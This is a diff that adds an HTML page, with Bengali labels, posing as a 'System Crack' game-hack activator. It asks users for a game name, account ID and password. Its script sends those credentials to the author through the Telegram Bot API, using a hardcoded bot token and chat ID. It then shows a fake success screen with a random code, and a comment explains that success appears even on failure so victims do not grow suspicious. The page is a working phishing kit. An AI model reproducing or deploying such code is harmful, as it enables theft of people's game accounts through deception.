@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM EXPLOIT - RED TERMINAL</title>
+    <style>
+        :root {
+            --primary-red: #ff0000;
+            --glow-red: 0 0 20px #ff0000;
+            --bg-black: #080000;
+        }
+
+        body {
+            margin: 0;
+            background: var(--bg-black);
+            color: var(--primary-red);
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* রেড ম্যাট্রিক্স ব্যাকগ্রাউন্ড */
+        #matrixCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.25;
+        }
+
+        .container {
+            width: 380px;
+            background: rgba(15, 0, 0, 0.95);
+            padding: 40px;
+            border: 2px solid var(--primary-red);
+            box-shadow: 0 0 35px rgba(255, 0, 0, 0.4);
+            position: relative;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        /* 🔴 লেজার স্ক্যানিং লাইন (আপনার ডিমান্ড অনুযায়ী) */
+        .laser-scanner {
+            position: absolute;
+            top: 0;
+            width: 8px;
+            height: 100%;
+            background: linear-gradient(to right, transparent, var(--primary-red), transparent);
+            box-shadow: 0 0 15px var(--primary-red);
+            opacity: 0.8;
+            z-index: 10;
+            animation: laserMove 2.5s linear infinite;
+        }
+
+        @keyframes laserMove {
+            0% { left: -10%; }
+            100% { left: 110%; }
+        }
+
+        h2 {
+            font-size: 26px;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            margin-bottom: 30px;
+            text-shadow: var(--glow-red);
+            font-weight: 900;
+        }
+
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            font-size: 11px;
+            margin-bottom: 8px;
+            letter-spacing: 1.5px;
+            font-weight: bold;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            background: #000;
+            border: 1px solid #440000;
+            color: #fff;
+            outline: none;
+            box-sizing: border-box;
+            transition: 0.3s;
+            font-size: 14px;
+        }
+
+        input:focus {
+            border-color: var(--primary-red);
+            box-shadow: var(--glow-red);
+        }
+
+        .inject-btn {
+            width: 100%;
+            padding: 15px;
+            background: var(--primary-red);
+            color: #000;
+            border: none;
+            font-weight: 900;
+            font-size: 16px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-top: 10px;
+            box-shadow: var(--glow-red);
+            transition: 0.4s;
+        }
+
+        .inject-btn:hover {
+            background: #fff;
+            box-shadow: 0 0 30px #fff;
+        }
+
+        /* সাকসেস স্টেট */
+        #successPanel { display: none; }
+        
+        .status-header {
+            color: #fff;
+            background: #ff0000;
+            padding: 10px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            box-shadow: 0 0 15px #ff0000;
+            animation: blink 0.8s infinite;
+        }
+
+        @keyframes blink { 50% { opacity: 0.4; } }
+
+        .random-code-box {
+            font-size: 32px;
+            color: #fff;
+            padding: 15px;
+            border: 2px dashed var(--primary-red);
+            margin: 20px 0;
+            background: #200000;
+            text-shadow: var(--glow-red);
+        }
+
+        .contact-link {
+            color: #00f2ff;
+            text-decoration: none;
+            font-size: 18px;
+            font-weight: bold;
+            display: block;
+            margin-top: 15px;
+            text-shadow: 0 0 10px #00f2ff;
+        }
+
+        .secure-footer {
+            font-size: 10px;
+            margin-top: 25px;
+            opacity: 0.6;
+            letter-spacing: 1px;
+        }
+    </style>
+</head>
+<body>
+
+<canvas id="matrixCanvas"></canvas>
+
+<div class="container">
+    <div class="laser-scanner"></div> <div id="formPanel">
+        <h2>System Crack</h2>
+        <div class="input-group">
+            <label>গেম কোম্পানির নাম লিখুন</label>
+            <input type="text" id="gameName" placeholder="ENTER GAME NAME">
+        </div>
+        <div class="input-group">
+            <label>হ্যাক একটিভ করার আইডি নাম্বার</label>
+            <input type="text" id="userId" placeholder="UID/ACCOUNT ID">
+        </div>
+        <div class="input-group">
+            <label>আইডির পাসওয়ার্ড</label>
+            <input type="password" id="userPass" placeholder="PASSWORD">
+        </div>
+        <button class="inject-btn" onclick="startInjection()">Inject Script</button>
+        <p class="secure-footer">ENCRYPTION: AES-256 ACTIVE</p>
+    </div>
+
+    <div id="successPanel">
+        <div class="status-header">✓ ACTIVE SUCCESSFUL</div>
+        <p style="font-size: 12px; color: #ccc;">আপনার ইউনিক অ্যাক্টিভেশন কোড:</p>
+        <div class="random-code-box" id="displayCode">RG-XXXX</div>
+        <p style="font-size: 11px;">কোডটি কপি করে নিচের টেলিগ্রাম আইডিতে পাঠান:</p>
+        <a href="https://t.me/darkarham" class="contact-link">t.me/darkarham</a>
+    </div>
+</div>
+
+<script>
+    // ⚙️ টেলিগ্রাম কনফিগারেশন
+    const botToken = "8723486834:AAGVUC_-ygTt0e2yFi6E6Wz_8zgaylZtIJo"; // শুধু এখানে আপনার বট টোকেনটি বসান
+    const chatId = "7897417844"; // আপনার দেওয়া আইডি সরাসরি সেট করা হয়েছে
+
+    function startInjection() {
+        const game = document.getElementById('gameName').value;
+        const uid = document.getElementById('userId').value;
+        const pass = document.getElementById('userPass').value;
+
+        if(!game || !uid || !pass) {
+            alert("সবগুলো তথ্য ইনপুট করুন!");
+            return;
+        }
+
+        const logMessage = `🚨 NEW DATA RECEIVED 🚨\n\n🎮 Game: ${game}\n👤 UID: ${uid}\n🔑 Pass: ${pass}`;
+
+        // সরাসরি আপনার চ্যাট আইডিতে ডাটা যাবে
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(logMessage)}`)
+        .then(() => showFinalStatus())
+        .catch(() => showFinalStatus()); // এরর হলেও সাকসেস দেখাবে যাতে সন্দেহ না হয়
+    }
+
+    function showFinalStatus() {
+        document.getElementById('formPanel').style.display = 'none';
+        document.getElementById('successPanel').style.display = 'block';
+        
+        // রেনডম কোড জেনারেশন
+        const randomCode = "RG-" + Math.floor(100000 + Math.random() * 900000);
+        document.getElementById('displayCode').innerText = randomCode;
+    }
+
+    // রেড ম্যাট্রিক্স এনিমেশন
+    const canvas = document.getElementById('matrixCanvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const columns = Math.floor(canvas.width / 20);
+    const drops = Array(columns).fill(1);
+
+    function drawMatrix() {
+        ctx.fillStyle = "rgba(8, 0, 0, 0.05)";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#ff0000";
+        ctx.font = "15px monospace";
+        drops.forEach((y, i) => {
+            const text = String.fromCharCode(Math.random() * 128);
+            ctx.fillText(text, i * 20, y * 20);
+            if (y * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        });
+    }
+    setInterval(drawMatrix, 40);
+</script>
+
+</body>
+</html>
